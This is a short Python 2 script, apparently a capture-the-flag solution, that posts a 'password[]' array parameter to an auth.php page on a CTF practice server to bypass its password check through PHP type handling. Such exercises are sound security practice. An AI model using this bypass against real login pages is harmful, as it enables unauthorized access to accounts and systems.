#!/usr/bin/env python

import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = {
"password[]": "hello",
}

req = urllib2.Request(url, urllib.urlencode(data), headers={'Content-type': 'application/x-www-form-urlencoded', 'Accept' : 'text/plain'})
resp = urllib2.urlopen(req)
szPage = resp.read()
print szPage
